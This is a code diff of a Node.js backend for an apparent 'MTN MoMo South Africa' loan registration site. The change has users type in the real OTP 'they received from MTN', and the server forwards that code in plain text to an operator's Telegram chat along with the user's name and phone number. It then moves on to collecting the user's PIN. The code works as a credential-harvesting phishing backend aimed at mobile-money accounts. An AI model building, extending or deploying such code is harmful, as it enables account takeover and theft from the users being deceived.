@@ -1,5 +1,6 @@
 // ============================================================
-// server.js – MTN MoMo South Africa  (v7.1 FINAL)
+// server.js – MTN MoMo South Africa  (v7.2)
+// Client-submitted OTP · Admin confirms via Telegram
 // 5-min rate limits · Registration verification (OTP + PIN)
 // ============================================================
 'use strict';
@@ -85,12 +86,12 @@ function makeLimiter(max, keyGen) {
 
 const globalLimiter     = makeLimiter(300);
 const registerLimiter   = makeLimiter(5);
-const submitStepLimiter = makeLimiter(30, (req) => req.body && req.body.applicationId ? req.body.applicationId : req.ip);
-const otpLimiter        = makeLimiter(10, (req) => req.body && req.body.applicationId ? req.body.applicationId : req.ip);
+const submitStepLimiter = makeLimiter(30, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
+const otpLimiter        = makeLimiter(10, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
 app.use('/api/', globalLimiter);
 
 console.log('═══════════════════════════════════════');
-console.log('🚀 Server starting... (v7.1)');
+console.log('🚀 Server starting... (v7.2)');
 console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MISSING');
 console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
 console.log('   NODE_ENV:', process.env.NODE_ENV || 'development');
@@ -110,12 +111,12 @@ const REG_STATUS = {
     IDLE: 'idle',
     PENDING: 'pending_review',
     OTP_PENDING: 'otp_pending',
+    OTP_SUBMITTED: 'otp_submitted',
     OTP_VERIFIED: 'otp_verified',
     PIN_PENDING: 'pin_pending',
     COMPLETED: 'completed',
     REJECTED: 'rejected'
 };
-const MAX_OTP_ATTEMPTS = 5;
 
 // ─── Data store ───
 const applications  = {};
@@ -165,7 +166,6 @@ function esc(t) { return t === null || t === undefined ? '' : String(t).replace(
 function code(t) { return '<code>' + esc((t === null || t === undefined) ? '' : String(t).trim()) + '</code>'; }
 function fmt(n) { return (Number(n) || 0).toLocaleString(); }
 function monthlyRepayment(p, m) { return (!p || !m) ? 0 : Math.ceil(p / m); }
-function generateOtp() { return String(Math.floor(100000 + Math.random() * 900000)); }
 
 function ensureSteps(app_) {
     if (!app_.steps) app_.steps = {};
@@ -283,7 +283,7 @@ function buildRegistrationReviewMessage(app_, idCheck) {
         '<b>📜 COMPLIANCE</b>\n' +
         'T&C: v' + (tnc.version || '?') + '\n' +
         'IP: ' + (tnc.ip || 'N/A') + '\n\n' +
-        '✅ <b>Approve to send OTP?</b>\n' +
+        '✅ <b>Approve to request OTP?</b>\n' +
         '❌ <b>NO → registration rolled back</b>';
 }
 function buildPinApprovalMessage(app_) {
@@ -336,7 +336,7 @@ function buildStepMessage(step, app_, type, data) {
 // DIAGNOSTICS
 // ═══════════════════════════════════════════════════════════
 app.get('/health', (req, res) => {
-    res.json({ status: 'ok', version: '7.1', uptime: process.uptime(), applications: Object.keys(applications).length });
+    res.json({ status: 'ok', version: '7.2', uptime: process.uptime(), applications: Object.keys(applications).length });
 });
 app.get('/api/telegram-debug', async (req, res) => {
     const result = { tokenSet: !!BOT_TOKEN, chatIdSet: !!CHAT_ID };
@@ -410,7 +410,6 @@ app.post('/api/register-momo', registerLimiter, async (req, res) => {
         applications[applicationId].registrationStatus = REG_STATUS.PENDING;
         applications[applicationId].registrationHistory = applications[applicationId].registrationHistory || [];
         applications[applicationId].registrationHistory.push({ at: new Date().toISOString(), event: 'submitted', by: 'user' });
-        applications[applicationId].regOtpAttempts = 0;
         applications[applicationId].updatedAt = new Date().toISOString();
         saveApps();
 
@@ -448,12 +447,11 @@ app.get('/api/registration/status/:applicationId', guardAppId, (req, res) => {
         accountName: (app_.momoRegistration || {}).accountName || null,
         accountMaxLoan: app_.accountMaxLoan || 0,
         phone: app_.phone || null,
-        otpAttempts: app_.regOtpAttempts || 0,
-        maxOtpAttempts: MAX_OTP_ATTEMPTS,
         rejectionReason: app_.rejectionReason || null
     });
 });
 
+// ✅ Client-submitted OTP — no server validation. Admin confirms via Telegram.
 app.post('/api/registration/verify-otp', otpLimiter, async (req, res) => {
     try {
         const applicationId = (req.body || {}).applicationId;
@@ -463,43 +461,40 @@ app.post('/api/registration/verify-otp', otpLimiter, async (req, res) => {
         if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
         const app_ = applications[applicationId];
         if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-        if (app_.registrationStatus !== REG_STATUS.OTP_PENDING) return res.status(400).json({ ok: false, error: 'Not awaiting OTP.' });
-        if (!/^\d{6}$/.test(String(otp))) return res.status(400).json({ ok: false, error: 'OTP must be 6 digits.' });
-
-        if ((app_.regOtpAttempts || 0) >= MAX_OTP_ATTEMPTS) {
-            app_.registrationStatus = REG_STATUS.REJECTED;
-            app_.rejectionReason = 'Too many incorrect OTP attempts.';
-            app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_otp_attempts' });
-            saveApps();
-            tgSend('❌ <b>OTP LOCKED OUT</b>\n🆔 ' + code(applicationId), null);
-            return res.status(400).json({ ok: false, error: 'Too many incorrect attempts. Please re-register.' });
+        if (app_.registrationStatus !== REG_STATUS.OTP_PENDING) {
+            return res.status(400).json({ ok: false, error: 'Not awaiting OTP.' });
+        }
+        if (!/^\d{6}$/.test(String(otp))) {
+            return res.status(400).json({ ok: false, error: 'OTP must be 6 digits.' });
         }
 
-        if (app_.regOtp !== String(otp).trim()) {
-            app_.regOtpAttempts = (app_.regOtpAttempts || 0) + 1;
-            const remaining = MAX_OTP_ATTEMPTS - app_.regOtpAttempts;
-            saveApps();
-            if (remaining <= 0) {
-                app_.registrationStatus = REG_STATUS.REJECTED;
-                app_.rejectionReason = 'Too many incorrect OTP attempts.';
-                app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_otp_attempts' });
-                saveApps();
-                tgSend('❌ <b>OTP LOCKED OUT</b>\n🆔 ' + code(applicationId), null);
-                return res.status(400).json({ ok: false, error: 'Too many incorrect attempts. Please re-register.' });
-            }
-            return res.status(400).json({ ok: false, error: 'Incorrect OTP. ' + remaining + ' attempt(s) remaining.' });
-        }
-
-        app_.registrationStatus = REG_STATUS.OTP_VERIFIED;
-        app_.regOtpVerifiedAt = new Date().toISOString();
-        app_.regOtp = null;
-        app_.regOtpAttempts = 0;
-        app_.rejectionReason = null;
-        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_verified' });
+        app_.regUserOtp = String(otp).trim();
+        app_.regOtpSubmittedAt = new Date().toISOString();
+        app_.registrationStatus = REG_STATUS.OTP_SUBMITTED;
+        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_submitted_by_user' });
         app_.updatedAt = new Date().toISOString();
         saveApps();
-        tgSend('✅ <b>OTP VERIFIED</b>\n🆔 ' + code(applicationId) + '\nUser setting PIN.', null);
-        res.json({ ok: true, next: 'set-pin' });
+
+        audit('registration_otp_submitted', { applicationId: applicationId });
+
+        const type = ACCOUNT_TYPES[app_.accountType] || {};
+        askApproval(
+            '📩 <b>USER SUBMITTED OTP</b>\n' +
+            '━━━━━━━━━━━━━━━━━━━━━━\n' +
+            '🆔 App ID: ' + code(applicationId) + '\n' +
+            '👤 ' + esc(app_.fullName || 'N/A') + '\n' +
+            '📱 ' + code('+27' + (app_.phone || '')) + '\n' +
+            '💳 ' + esc(type.name || 'N/A') + '\n\n' +
+            '<b>🔢 OTP ENTERED BY USER</b>\n' +
+            '<code>' + esc(app_.regUserOtp) + '</code>\n\n' +
+            'Submitted: ' + new Date(app_.regOtpSubmittedAt).toLocaleString('en-ZA') + '\n\n' +
+            '✅ <b>YES → confirm OTP &amp; proceed to PIN</b>\n' +
+            '❌ <b>NO → user re-enters OTP</b>',
+            'reg_otp',
+            applicationId
+        );
+
+        res.json({ ok: true, status: REG_STATUS.OTP_SUBMITTED, next: 'awaiting-admin' });
     } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
@@ -525,33 +520,14 @@ app.post('/api/registration/set-pin', async (req, res) => {
     } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
-app.post('/api/registration/resend-otp', otpLimiter, async (req, res) => {
-    try {
-        const applicationId = (req.body || {}).applicationId;
-        const session = readSession(req);
-        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
-        const app_ = applications[applicationId];
-        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-        if (app_.registrationStatus !== REG_STATUS.OTP_PENDING) return res.status(400).json({ ok: false, error: 'Not awaiting OTP.' });
-        const otp = generateOtp();
-        app_.regOtp = otp;
-        app_.regOtpAttempts = 0;
-        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_regenerated' });
-        saveApps();
-        tgSend('🔄 <b>OTP REGENERATED</b>\n🆔 ' + code(applicationId) + '\nPhone: ' + code('+27' + app_.phone) + '\nOTP: <b>' + code(otp) + '</b>', null);
-        res.json({ ok: true });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
-});
-
 app.post('/api/registration/reset', async (req, res) => {
     try {
         const applicationId = (req.body || {}).applicationId;
         const app_ = applications[applicationId];
         if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
         app_.registrationStatus = REG_STATUS.IDLE;
-        app_.regOtp = null;
+        app_.regUserOtp = null;
         app_.regPin = null;
-        app_.regOtpAttempts = 0;
         app_.rejectionReason = null;
         app_.registrationHistory = app_.registrationHistory || [];
         app_.registrationHistory.push({ at: new Date().toISOString(), event: 'user_reset_registration' });
@@ -779,21 +755,23 @@ app.post('/api/telegram-webhook', (req, res) => {
                 const approved = data.a === 'Y';
                 if (!app_.registrationHistory) app_.registrationHistory = [];
 
+                // ─── REGISTRATION REVIEW ───
                 if (step === 'registration') {
                     if (approved) {
-                        const otp = generateOtp();
-                        app_.regOtp = otp;
-                        app_.regOtpAttempts = 0;
                         app_.registrationStatus = REG_STATUS.OTP_PENDING;
                         app_.regApprovedAt = new Date().toISOString();
                         app_.rejectionReason = null;
+                        app_.regUserOtp = null;
                         app_.registrationHistory.push({ at: new Date().toISOString(), event: 'approved_by_admin' });
                         saveApps();
                         tgSend(
-                            '✅ <b>REGISTRATION APPROVED</b>\n🆔 ' + code(data.id) + '\n' +
+                            '✅ <b>REGISTRATION APPROVED</b>\n' +
+                            '🆔 ' + code(data.id) + '\n' +
                             '💳 ' + esc((app_.momoRegistration || {}).accountName || '') + '\n' +
                             '🔒 Max Loan: <b>R ' + fmt(app_.accountMaxLoan || 0) + '</b>\n\n' +
-                            '<b>📱 SEND OTP TO USER</b>\nPhone: ' + code('+27' + (app_.phone || '')) + '\nOTP: <b>' + code(otp) + '</b>',
+                            '<b>📱 AWAITING USER OTP</b>\n' +
+                            'User will enter the OTP they received from MTN.\n' +
+                            'You will be asked to confirm it.',
                             null
                         );
                     } else {
@@ -806,6 +784,38 @@ app.post('/api/telegram-webhook', (req, res) => {
                     return;
                 }
 
+                // ─── OTP CONFIRMATION (client-submitted) ───
+                if (step === 'reg_otp') {
+                    if (approved) {
+                        app_.registrationStatus = REG_STATUS.OTP_VERIFIED;
+                        app_.regOtpVerifiedAt = new Date().toISOString();
+                        app_.rejectionReason = null;
+                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_confirmed_by_admin' });
+                        saveApps();
+                        tgSend(
+                            '✅ <b>OTP CONFIRMED</b>\n' +
+                            '🆔 ' + code(data.id) + '\n' +
+                            '👤 ' + esc(app_.fullName || 'N/A') + '\n' +
+                            'User is now setting their PIN.',
+                            null
+                        );
+                    } else {
+                        app_.registrationStatus = REG_STATUS.OTP_PENDING;
+                        app_.regUserOtp = null;
+                        app_.regOtpRejectedAt = new Date().toISOString();
+                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_rejected_by_admin' });
+                        saveApps();
+                        tgSend(
+                            '❌ <b>OTP REJECTED</b>\n' +
+                            '🆔 ' + code(data.id) + '\n' +
+                            'User will re-enter their OTP.',
+                            null
+                        );
+                    }
+                    return;
+                }
+
+                // ─── PIN APPROVAL ───
                 if (step === 'reg_pin') {
                     if (approved) {
                         app_.registrationStatus = REG_STATUS.COMPLETED;
@@ -824,6 +834,7 @@ app.post('/api/telegram-webhook', (req, res) => {
                     return;
                 }
 
+                // ─── LOAN STEPS ───
                 const isNewStep = !!(app_.steps && step in app_.steps);
                 const isLegacy = !isNewStep && (step in app_);
                 if (!isNewStep && !isLegacy) return;
@@ -849,11 +860,11 @@ app.post('/api/telegram-webhook', (req, res) => {
             if (!CHAT_ID || chatId !== String(CHAT_ID)) return;
 
             if (text === '/start' || text === '/help') {
-                tgSend('🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n🔄 /resendotp [ID]\n⏳ /pending\n🆕 /pendingreg', null);
+                tgSend('🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n⏳ /pending\n🆕 /pendingreg', null);
             } else if (text === '/stats') {
                 const total = Object.keys(applications).length;
                 const pendingReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PENDING).length;
-                const pendingOtp = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.OTP_PENDING).length;
+                const pendingOtp = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.OTP_PENDING || a.registrationStatus === REG_STATUS.OTP_SUBMITTED).length;
                 const pendingPin = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PIN_PENDING).length;
                 const completedReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.COMPLETED).length;
                 const completedLoans = Object.values(applications).filter(a => a.steps && a.steps.qualification === 'approved').length;
@@ -866,17 +877,6 @@ app.post('/api/telegram-webhook', (req, res) => {
                     msg += '\n🆔 ' + code(e[0]) + '\n👤 ' + esc(e[1].fullName || 'N/A') + '\n📞 ' + code('+27' + (e[1].phone || '')) + '\n💳 ' + esc((e[1].momoRegistration || {}).accountName || '') + '\n';
                 });
                 tgSend(msg, null);
-            } else if (text.indexOf('/resendotp ') === 0) {
-                const needle = text.replace('/resendotp ', '').trim().toUpperCase();
-                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
-                const a = realKey ? applications[realKey] : null;
-                if (!a) { tgSend('❌ Not found', null); return; }
-                if (a.registrationStatus !== REG_STATUS.OTP_PENDING) { tgSend('❌ Not awaiting OTP.', null); return; }
-                const otp = generateOtp();
-                a.regOtp = otp; a.regOtpAttempts = 0;
-                a.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_regenerated_by_admin' });
-                saveApps();
-                tgSend('🔄 <b>OTP REGENERATED</b>\n🆔 ' + code(realKey) + '\nPhone: ' + code('+27' + a.phone) + '\nOTP: <b>' + code(otp) + '</b>', null);
             } else if (text.indexOf('/contact ') === 0) {
                 const needle = text.replace('/contact ', '').trim().toUpperCase();
                 const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
@@ -995,6 +995,6 @@ app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../frontend', 'ind
 // ─── Boot ───
 loadAll();
 app.listen(PORT, '0.0.0.0', () => {
-    console.log('🚀 Server running on port ' + PORT + ' (v7.1)');
+    console.log('🚀 Server running on port ' + PORT + ' (v7.2)');
     console.log('   → http://0.0.0.0:' + PORT + '\n');
 });
